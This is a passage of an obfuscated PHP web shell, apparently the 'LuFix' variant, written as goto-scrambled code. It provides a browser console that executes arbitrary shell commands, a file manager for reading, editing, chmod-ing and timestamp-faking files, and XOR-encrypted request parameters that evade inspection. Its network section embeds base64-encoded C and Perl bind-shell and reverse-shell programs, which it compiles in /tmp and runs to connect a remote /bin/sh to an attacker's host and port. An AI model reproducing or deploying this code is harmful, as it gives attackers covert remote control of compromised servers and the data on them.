                            goto vOjOu;
                            ToLlu:
                        }
                        break;
                }
            }
            goto trCq4;
            hTKit:
            usort($files, "cmp");
            goto ISuV1;
            o_R5w:
            echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
            goto uNmhK;
            YV86k:
            function cmp($a, $b)
            {
                if ($GLOBALS['sort'][0] != 'size') {
                    return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
                } else {
                    return ($a['size'] < $b['size'] ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
                }
            }
            goto hTKit;
            rEtu9:
            $n = count($dirContent);
            goto iD_jp;
            KJtCC:
        }
        goto bcjO8;
        FIuqD:
        if (PHP_VERSION_ID < 70000) {
            @set_magic_quotes_runtime(0);
        }
        goto AkTvB;
        xtaAz:
        function viewSize($s)
        {
            if ($s >= 1073741824) {
                return sprintf('%1.2f', $s / 1073741824) . ' GB';
            } elseif ($s >= 1048576) {
                return sprintf('%1.2f', $s / 1048576) . ' MB';
            } elseif ($s >= 1024) {
                return sprintf('%1.2f', $s / 1024) . ' KB';
            } else {
                return $s . ' B';
            }
        }
        goto psmtL;
        AkTvB:
        @define('VERSION', 'LuFix');
        goto g7Iz9;
        fUR2V:
        function prototype($k, $v)
        {
            $_COOKIE[$k] = $v;
            setcookie($k, $v);
        }
        goto nI0Kt;
        g2lf6:
        function actionNetwork()
        {
            goto gpI4p;
            Y7gfA:
            echo '</div>';
            goto Hycio;
            gpI4p:
            YCSzmHeader();
            goto yaVq4;
            Hycio:
            YCSzmFooter();
            goto nQI4T;
            YTN0p:
            $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
            goto f10Pj;
            yaVq4:
            $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
            goto YTN0p;
            sYQ0w:
            if (isset($_POST['p1'])) {
                goto xazx7;
                QMkmX:
                if ($_POST['p1'] == 'bpc') {
                    goto mYytS;
                    mYytS:
                    cf("/tmp/bp.c", $bind_port_c);
                    goto QjS0x;
                    qApck:
                    $▖ .= ex("/tmp/bp " . $_POST['p2'] . " " . $_POST['p3'] . " &");
                    goto B9g9m;
                    l34Bs:
                    @unlink("/tmp/bp.c");
                    goto qApck;
                    B9g9m:
                    echo "<pre class=ml1>{$▖}" . ex("ps aux | grep bp") . "</pre>";
                    goto RryhG;
                    QjS0x:
                    $▖ = ex("gcc -o /tmp/bp /tmp/bp.c");
                    goto l34Bs;
                    RryhG:
                }
                goto cYcHZ;
                beKuf:
                if ($_POST['p1'] == 'bcp') {
                    goto ps46l;
                    LP46H:
                    echo "<pre class=ml1>{$▖}" . ex("ps aux | grep bc.pl") . "</pre>";
                    goto Wp5DO;
                    ps46l:
                    cf("/tmp/bc.pl", $back_connect_p);
                    goto iPJO9;
                    iPJO9:
                    $▖ = ex(which("perl") . " /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " &");
                    goto LP46H;
                    Wp5DO:
                }
                goto IUq1D;
                cYcHZ:
                if ($_POST['p1'] == 'bpp') {
                    goto JpT3g;
                    guvMt:
                    echo "<pre class=ml1>{$▖}" . ex("ps aux | grep bp.pl") . "</pre>";
                    goto KZP6o;
                    t4Kmb:
                    $▖ = ex(which("perl") . " /tmp/bp.pl " . $_POST['p2'] . " &");
                    goto guvMt;
                    JpT3g:
                    cf("/tmp/bp.pl", $bind_port_p);
                    goto t4Kmb;
                    KZP6o:
                }
                goto sepsC;
                sepsC:
                if ($_POST['p1'] == 'bcc') {
                    goto I2l9t;
                    Xm04u:
                    @unlink("/tmp/bc.c");
                    goto npB8v;
                    npB8v:
                    $▖ .= ex("/tmp/bc " . $_POST['p2'] . " " . $_POST['p3'] . " &");
                    goto wywhV;
                    CuQXd:
                    $▖ = ex("gcc -o /tmp/bc /tmp/bc.c");
                    goto Xm04u;
                    wywhV:
                    echo "<pre class=ml1>{$▖}" . ex("ps aux | grep bc") . "</pre>";
                    goto Se2Wa;
                    I2l9t:
                    cf("/tmp/bc.c", $back_connect_c);
                    goto CuQXd;
                    Se2Wa:
                }
                goto beKuf;
                xazx7:
                function cf($f, $t)
                {
                    $w = @fopen($f, "w") or @function_exists('file_put_contents');
                    if ($w) {
                        @fwrite($w, @base64_decode($t)) or @fputs($w, @base64_decode($t)) or @file_put_contents($f, @base64_decode($t));
                        @fclose($w);
                    }
                }
                goto QMkmX;
                IUq1D:
            }
            goto Y7gfA;
            XFskF:
            echo "<h1>Network tools</h1><div class=content>\r\n\t<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>\r\n\t<span>Bind port to /bin/sh</span><br/>\r\n\tPort: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='submit'>\r\n\t</form>\r\n\t<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>\r\n\t<span>Back-connect to</span><br/>\r\n\tServer: <input type='text' name='server' value=" . $_SERVER['REMOTE_ADDR'] . "> Port: <input type='text' name='port' value='31337'> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input type=submit value='submit'>\r\n\t</form><br>";
            goto sYQ0w;
            f10Pj:
            $bind_port_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
            goto eZH1u;
            eZH1u:
            $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
            goto XFskF;
            nQI4T:
        }
        goto CwDBi;
        g7Iz9:
        if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
            goto YlgEF;
            YlgEF:
            function stripslashes_array($array)
            {
                return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
            }
            goto BbKrh;
            FsvJq:
            $_COOKIE = stripslashes_array($_COOKIE);
            goto haybs;
            BbKrh:
            $_POST = stripslashes_array($_POST);
            goto FsvJq;
            haybs:
        }
        goto N5Bc5;
        pQ5ec:
        if ($cwd[strlen($cwd) - 1] != '/') {
            $cwd .= '/';
        }
        goto NfUGZ;
        hfJGa:
        if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) {
            call_user_func('action' . $_POST['a']);
        }
        goto a_FGf;
        RPpeU:
        function actionConsole()
        {
            goto ze4wn;
            VfuxT:
            echo '</form></div><script>d.cf.cmd.focus();</script>';
            goto fz37F;
            d8jwg:
            echo "<script>\r\nif(window.Event) window.captureEvents(Event.KEYDOWN);\r\nvar cmds = new Array('');\r\nvar cur = 0;\r\nfunction kp(e) {\r\n\tvar n = (window.Event) ? e.which : e.keyCode;\r\n\tif(n == 38) {\r\n\t\tcur--;\r\n\t\tif(cur>=0)\r\n\t\t\tdocument.cf.cmd.value = cmds[cur];\r\n\t\telse\r\n\t\t\tcur++;\r\n\t} else if(n == 40) {\r\n\t\tcur++;\r\n\t\tif(cur < cmds.length)\r\n\t\t\tdocument.cf.cmd.value = cmds[cur];\r\n\t\telse\r\n\t\t\tcur--;\r\n\t}\r\n}\r\nfunction add(cmd) {\r\n\tcmds.pop();\r\n\tcmds.push(cmd);\r\n\tcmds.push('');\r\n\tcur = cmds.length-1;\r\n}\r\n</script>";
            goto xBhfO;
            jWEMn:
            YCSzmHeader();
            goto d8jwg;
            xBhfO:
            echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
            goto OsLRP;
            ukJ2n:
            if (isset($_POST['ajax'])) {
                goto DH1R2;
                td73f:
                exit;
                goto SXeCQ;
                Ruc42:
                $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n\$ " . $_POST['p1'] . "\n" . ex($_POST['p1']), "\n\r\t\\'\0"));
                goto Nr0ke;
                q3fEt:
                echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
                goto NgtFC;
                mDIDC:
                echo strlen($temp), "\n", $temp;
                goto td73f;
                mfHFu:
                echo "d.cf.output.value+='" . $temp . "';";
                goto q3fEt;
                xpto2:
                echo "d.cf.cmd.value='';\n";
                goto Ruc42;
                NgtFC:
                $temp = ob_get_clean();
                goto mDIDC;
                Nr0ke:
                if (preg_match("!.*cd\\s+([^;]+)\$!", $_POST['p1'], $match)) {
                    if (@chdir($match[1])) {
                        $GLOBALS['cwd'] = @getcwd();
                        echo "c_='" . $GLOBALS['cwd'] . "';";
                    }
                }
                goto mfHFu;
                DH1R2:
                prototype(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
                goto KEH42;
                KEH42:
                ob_start();
                goto xpto2;
                SXeCQ:
            }
            goto mw3TL;
            OsLRP:
            foreach ($GLOBALS['aliases'] as $n => $v) {
                if ($v == '') {
                    echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
                    continue;
                }
                echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
            }
            goto f2C8q;
            fz37F:
            YCSzmFooter();
            goto HnWVX;
            f2C8q:
            echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
            goto EV6W5;
            Wywk0:
            echo '</textarea><table style="border:1px solid #060a10;background-color:#060a10;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
            goto VfuxT;
            mw3TL:
            if (empty($_POST['ajax']) && !empty($_POST['p1'])) {
                prototype(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
            }
            goto jWEMn;
            EV6W5:
            if (!empty($_POST['p1'])) {
                echo htmlspecialchars("\$ " . $_POST['p1'] . "\n" . ex($_POST['p1']));
            }
            goto Wywk0;
            ze4wn:
            if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
                prototype(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
                $_POST['p1'] .= ' 2>&1';
            } elseif (!empty($_POST['p1'])) {
                prototype(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0);
            }
            goto ukJ2n;
            HnWVX:
        }
        goto ahbp0;
        QJ2tV:
        function decrypt($str, $pwd)
        {
            goto XgT8N;
            Kha7v:
            while ($i < strlen($str)) {
                for ($j = 0; $j < strlen($pwd); $j++) {
                    $enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
                    $enc_str .= $enc_chr;
                    $i++;
                    if ($i >= strlen($str)) {
                        break;
                    }
                }
            }
            goto RUszX;
            oCMst:
            $i = 0;
            goto Kha7v;
            XgT8N:
            $pwd = base64_encode($pwd);
            goto JA03C;
            m3Mds:
            $enc_chr = "";
            goto Pi8jL;
            RUszX:
            return base64_decode($enc_str);
            goto dvkH7;
            JA03C:
            $str = base64_decode($str);
            goto m3Mds;
            Pi8jL:
            $enc_str = "";
            goto oCMst;
            dvkH7:
        }
        goto fUR2V;
        MGTBJ:
        if (!isset($_POST['ne'])) {
            goto ctBg5;
            rCtNk:
            if (isset($_POST['p1'])) {
                $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
            }
            goto ZEaGu;
            ctBg5:
            if (isset($_POST['a'])) {
                $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
            }
            goto jM3fx;
            jM3fx:
            if (isset($_POST['c'])) {
                $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
            }
            goto rCtNk;
            ZEaGu:
            if (isset($_POST['p2'])) {
                $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
            }
            goto B0pMa;
            B0pMa:
            if (isset($_POST['p3'])) {
                $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'], $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"]));
            }
            goto KaGvS;
            KaGvS:
        }
        goto DTG4h;
        olUV9:
        function YCSzmScandir($dir)
        {
            if (function_exists("scandir")) {
                return scandir($dir);
            } else {
                goto w5Ip0;
                UWA2W:
                while (false !== ($filename = readdir($dh))) {
                    $files[] = $filename;
                }
                goto pETAd;
                w5Ip0:
                $dh = opendir($dir);
                goto UWA2W;
                pETAd:
                return $files;
                goto mDp8L;
                mDp8L:
            }
        }
        goto jNrxQ;
        qat6Y:
        function YCSzmFooter()
        {
            $is_writable = is_writable($GLOBALS['cwd']) ? " <font color='#FFDB5F'>[ Writeable ]</font>" : " <font color=red>(Not writable)</font>";
            echo "\r\n</div>\r\n<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>\r\n\t<tr>\r\n\t\t<td><form onsubmit=\"" . (function_exists('actionFilesMan') ? "g(null,this.c.value,'');" : '') . "return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=submit value='submit'></form></td>\r\n\t\t<td><form onsubmit=\"" . (function_exists('actionFilesTools') ? "g('FilesTools',null,this.f.value);" : '') . "return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>\r\n\t</tr><tr>\r\n\t\t<td><form onsubmit=\"" . (function_exists('actionFilesMan') ? "g('FilesMan',null,'mkdir',this.d.value);" : '') . "return false;\"><span>Make dir:</span>{$is_writable}<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>\r\n\t\t<td><form onsubmit=\"" . (function_exists('actionFilesTools') ? "g('FilesTools',null,this.f.value,'mkfile');" : '') . "return false;\"><span>Make file:</span>{$is_writable}<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>\r\n\t</tr><tr>\r\n\t\t<td><form onsubmit=\"" . (function_exists('actionConsole') ? "g('Console',null,this.c.value);" : '') . "return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>\r\n\t\t<td><form method='post' " . (!function_exists('actionFilesMan') ? " onsubmit=\"return false;\" " : '') . "ENCTYPE='multipart/form-data'>\r\n\t\t<input type=hidden name=a value='FilesMan'>\r\n\t\t<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>\r\n\t\t<input type=hidden name=p1 value='uploadFile'>\r\n\t\t<input type=hidden name=ne value=''>\r\n\t\t<input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n\t\t<span>Upload file:</span>{$is_writable}<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>\r\n\t</tr></table></div>\r\n\t<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>\r\n\t<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>\r\n\t</body></html>";
        }
        goto W8IuU;
        NN1RP:
        function actionFilesTools()
        {
            goto fReTm;
            Vz_tu:
            $uid = @posix_getpwuid(@fileowner($_POST['p1']));
            goto o35vM;
            m6TNG:
            if (!file_exists(@$_POST['p1'])) {
                goto S2ERJ;
                a0vRW:
                return;
                goto OZADa;
                S2ERJ:
                echo 'File not exists';
                goto omAXw;
                omAXw:
                YCSzmFooter();
                goto a0vRW;
                OZADa:
            }
            goto Vz_tu;
            ncB7C:
            echo '<h1>File tools</h1><div class=content>';
            goto m6TNG;
            o35vM:
            if (!$uid) {
                $uid['name'] = @fileowner($_POST['p1']);
                $gid['name'] = @filegroup($_POST['p1']);
            } else {
                $gid = @posix_getgrgid(@filegroup($_POST['p1']));
            }
            goto aatIE;
            fReTm:
            if (isset($_POST['p1'])) {
                $_POST['p1'] = urldecode($_POST['p1']);
            }
            goto X3lB0;
            pCRbK:
            switch ($_POST['p2']) {
                case 'view':
                    goto tjf7n;
                    tjf7n:
                    echo '<pre class=ml1>';
                    goto n3tGe;
                    szgQu:
                    if ($fp) {
                        while (!@feof($fp)) {
                            echo htmlspecialchars(@fread($fp, 1024));
                        }
                        @fclose($fp);
                    }
                    goto FuSO4;
                    n3tGe:
                    $fp = @fopen($_POST['p1'], 'r');
                    goto szgQu;
                    q_YmD:
                    break;
                    goto L7wyM;
                    FuSO4:
                    echo '</pre>';
                    goto q_YmD;
                    L7wyM:
                case 'highlight':
                    if (@is_readable($_POST['p1'])) {
                        goto cAds1;
                        aZY3f:
                        echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $oRb) . '</div>';
                        goto Ls03s;
                        cAds1:
                        echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                        goto Xvhrf;
                        Xvhrf:
                        $oRb = @highlight_file($_POST['p1'], true);
                        goto aZY3f;
                        Ls03s:
                    }
                    break;
                case 'chmod':
                    goto mS9wq;
                    MdVGn:
                    clearstatcache();
                    goto vTtQf;
                    mS9wq:
                    if (!empty($_POST['p3'])) {
                        goto QTz3L;
                        n31BB:
                        for ($i = strlen($_POST['p3']) - 1; $i >= 0; --$i) {
                            $perms += (int) $_POST['p3'][$i] * pow(8, strlen($_POST['p3']) - $i - 1);
                        }
                        goto fXNzc;
                        QTz3L:
                        $perms = 0;
                        goto n31BB;
                        fXNzc:
                        if (!@chmod($_POST['p1'], $perms)) {
                            echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                        }
                        goto kLaHF;
                        kLaHF:
                    }
                    goto MdVGn;
                    IqL9_:
                    break;
                    goto VE7k0;
                    vTtQf:
                    echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value="submit"></form>';
                    goto IqL9_;
                    VE7k0:
                case 'edit':
                    goto kBP0R;
                    F3kMS:
                    if ($fp) {
                        while (!@feof($fp)) {
                            echo htmlspecialchars(@fread($fp, 1024));
                        }
                        @fclose($fp);
                    }
                    goto wzFab;
                    kBP0R:
                    if (!is_writable($_POST['p1'])) {
                        echo 'File isn\'t writeable';
                        break;
                    }
                    goto AdzGF;
                    RQPVU:
                    echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
                    goto DSnkp;
                    mYeix:
                    break;
                    goto BAlYr;
                    wzFab:
                    echo '</textarea><input type=submit value="submit"></form>';
                    goto mYeix;
                    DSnkp:
                    $fp = @fopen($_POST['p1'], 'r');
                    goto F3kMS;
                    AdzGF:
                    if (!empty($_POST['p3'])) {
                        goto rmDos;
                        rmDos:
                        $time = @filemtime($_POST['p1']);
                        goto ApTNV;
                        jIY1X:
                        $fp = @fopen($_POST['p1'], "w");
                        goto O4UH4;
                        O4UH4:
                        if ($fp) {
                            goto FKjJn;
                            zlPRy:
                            echo 'Saved!<br><script>p3_="";</script>';
                            goto hNXH2;
                            FKjJn:
                            @fwrite($fp, $_POST['p3']);
                            goto HvpO4;
                            HvpO4:
                            @fclose($fp);
                            goto zlPRy;
                            hNXH2:
                            @touch($_POST['p1'], $time, $time);
                            goto QcqP0;
                            QcqP0:
                        }
                        goto Orjrn;
                        ApTNV:
                        $_POST['p3'] = substr($_POST['p3'], 1);
                        goto jIY1X;
                        Orjrn:
                    }
                    goto RQPVU;
                    BAlYr:
                case 'hexdump':
                    goto mYzq1;
                    JbKkX:
                    echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#060a10><pre>' . $h[1] . '</pre></td><td bgcolor=#202832><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
                    goto OplQD;
                    beWtI:
                    $h = array('00000000<br>', '', '');
                    goto dLB_1;
                    dLB_1:
                    $len = strlen($c);
                    goto E83WU;
                    mYzq1:
                    $c = @file_get_contents($_POST['p1']);
                    goto SuoJk;
                    SuoJk:
                    $n = 0;
                    goto beWtI;
                    OplQD:
                    break;
                    goto OUJW1;
                    E83WU:
                    for ($i = 0; $i < $len; ++$i) {
                        $h[1] .= sprintf('%02X', ord($c[$i])) . ' ';
                        switch (ord($c[$i])) {
                            case 0:
                                $h[2] .= ' ';
                                break;
                            case 9:
                                $h[2] .= ' ';
                                break;
                            case 10:
                                $h[2] .= ' ';
                                break;
                            case 13:
                                $h[2] .= ' ';
                                break;
                            default:
                                $h[2] .= $c[$i];
                                break;
                        }
                        $n++;
                        if ($n == 32) {
                            goto H4kSX;
                            szL7k:
                            $h[1] .= '<br>';
                            goto OSmYU;
                            H4kSX:
                            $n = 0;
                            goto jxaBd;
                            jxaBd:
                            if ($i + 1 < $len) {
                                $h[0] .= sprintf('%08X', $i + 1) . '<br>';
                            }
                            goto szL7k;
                            OSmYU:
                            $h[2] .= "\n";
                            goto C6pIG;
                            C6pIG:
                        }
                    }
                    goto JbKkX;
                    OUJW1:
                case 'rename':
                    goto qYRPn;
                    PQhJZ:
                    echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value="submit"></form>';
                    goto NrEJg;
                    NrEJg:
                    break;
                    goto Lb1Bm;
                    qYRPn:
                    if (!empty($_POST['p3'])) {
                        if (!@rename($_POST['p1'], $_POST['p3'])) {
                            echo 'Can\'t rename!<br>';
                        } else {
                            die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
                        }
                    }
                    goto PQhJZ;
                    Lb1Bm:
                case 'touch':
                    goto PH0s2;
                    x22eB:
                    break;
                    goto BLb_K;
                    pRh_c:
                    clearstatcache();
                    goto yFIwE;
                    PH0s2:
                    if (!empty($_POST['p3'])) {
                        $time = strtotime($_POST['p3']);
                        if ($time) {
                            if (!touch($_POST['p1'], $time, $time)) {
                                echo 'Fail!';
                            } else {
                                echo 'Touched!';
                            }
                        } else {
                            echo 'Bad time format!';
                        }
                    }
                    goto pRh_c;
                    yFIwE:
